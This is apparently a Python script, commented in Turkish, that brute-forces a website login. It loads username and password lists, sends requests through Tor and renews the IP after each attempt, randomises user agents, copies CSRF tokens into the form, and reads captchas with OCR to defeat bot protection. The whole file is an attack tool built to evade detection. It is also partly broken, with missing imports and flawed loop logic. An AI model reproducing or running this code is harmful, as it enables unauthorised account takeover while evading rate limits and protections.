# requests, stem, fake-useragent, pytesseract ve threading modüllerini içe aktar
import requests
from stem import Signal
from stem.control import Controller
from fake_useragent import UserAgent
import pytesseract
import threading

# URL, kullanıcı adı listesi dosyası ve şifre listesi dosyasının yollarını al
url = input("Lütfen login sayfasının URL'sini girin: ")
username_file = input("Lütfen kullanıcı adı listesinin bulunduğu txt dosyasının yolunu girin: ")
password_file = input("Lütfen şifre listesinin bulunduğu txt dosyasının yolunu girin: ")

# Kullanıcı adı ve şifre listelerini oku ve birer liste haline getir
with open(username_file, "r") as f:
    usernames = f.read().splitlines()

with open(password_file, "r") as f:
    passwords = f.read().splitlines()

# Tor ağına bağlanmak için proxy ayarlarını yap
proxies = {
    "http": "socks5://127.0.0.1:9050",
    "https": "socks5://127.0.0.1:9050"
}

# User-agent oluşturmak için UserAgent nesnesi oluştur
ua = UserAgent()

# Login sayfasına bir GET isteği gönder ve HTML içeriğini al
response = requests.get(url, proxies=proxies)
html = response.text

# HTML içeriğini BeautifulSoup ile ayrıştır
soup = BeautifulSoup(html, "html.parser")

# Login formunu bul
form = soup.find("form")

# Login formundaki alanların isimlerini bul
fields = form.find_all("input")
field_names = [field.get("name") for field in fields]

# Login formunda CSRF tokeni veya başka bir doğrulama mekanizması varsa, bunun değerini al
token_name = None
token_value = None
for field in fields:
    if field.get("type") == "hidden":
        token_name = field.get("name")
        token_value = field.get("value")
        break

# Login formunda captcha veya başka bir bot koruması varsa, bunun değerini al
captcha_name = None
captcha_value = None
for field in fields:
    if field.get("type") == "image":
        captcha_name = field.get("name")
        captcha_url = url + "/" + field.get("src")
        # Captcha resmini indir ve OCR ile metne dönüştür
        captcha_image = requests.get(captcha_url, proxies=proxies).content
        captcha_value = pytesseract.image_to_string(captcha_image)
        break

# Her kullanıcı adı ve şifre için login sayfasına bir POST isteği gönderen fonksiyon tanımla
def try_login(username, password):
    # Yeni bir user-agent oluştur
    user_agent = ua.random
    # İstek başlıklarını oluştur
    headers = {"User-Agent": user_agent}
    # Login formunda kullanılacak verileri oluştur
    data = {}
    data[field_names[0]] = username # Kullanıcı adı alanına kullanıcı adını ata
    data[field_names[1]] = password # Şifre alanına şifreyi ata
    if token_name and token_value: # Eğer CSRF tokeni veya başka bir doğrulama mekanizması varsa
        data[token_name] = token_value # Bu alanın değerini de ata
    if captcha_name and captcha_value: # Eğer captcha veya başka bir bot koruması varsa
        data[captcha_name] = captcha_value # Bu alanın değerini de ata
    
    # POST metoduyla isteği gönder ve yanıtı al
    response = requests.post(url, data=data, headers=headers, proxies=proxies)
    
    # Yanıtın içeriğini kontrol et
    if "Başarısız" not in response.text and "Failed" not in response.text: # Başarılı login olduğunu varsay
        print(f"Kullanıcı adı ve şifreyi buldum: {username}:{password}")
        return True # Fonksiyondan çık
    else: # Başarısız login olduğunu bildir
        print(f"Bu kullanıcı adı ve şifre işe yaramadı: {username}:{password}")
        return False

# Tor ağında yeni bir IP adresi almak için fonksiyon tanımla
def renew_tor_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password="tor_password") # Tor ağının parolasını girin
        controller.signal(Signal.NEWNYM)

# Çoklu iş parçacığı kullanarak brute force saldırısı yapmak için fonksiyon tanımla
def brute_force():
    for username in usernames:
        for password in passwords:
            # Login sayfasına istek gönder ve sonucu al
            result = try_login(username, password)
            if result: # Eğer başarılı login olduysa
                break # Döngüden çık
            
            # Kullanıcı tarafından belirlenen bir zaman aralığı bekleyin
            delay = int(input("Her istek arasında kaç saniye beklemek istersiniz? "))
            time.sleep(delay)
            
            # Tor ağında yeni bir IP adresi alın
            renew_tor_ip()

# Brute force saldırısını başlatmak için ana fonksiyon tanımla
def main():
    # Brute force saldırısı için bir iş parçacığı oluştur
    thread = threading.Thread(target=brute_force)
    # İş parçacığını başlat
    thread.start()
    # İş parçacığının bitmesini bekle
    thread.join()

# Ana fonksiyonu çağır
main()
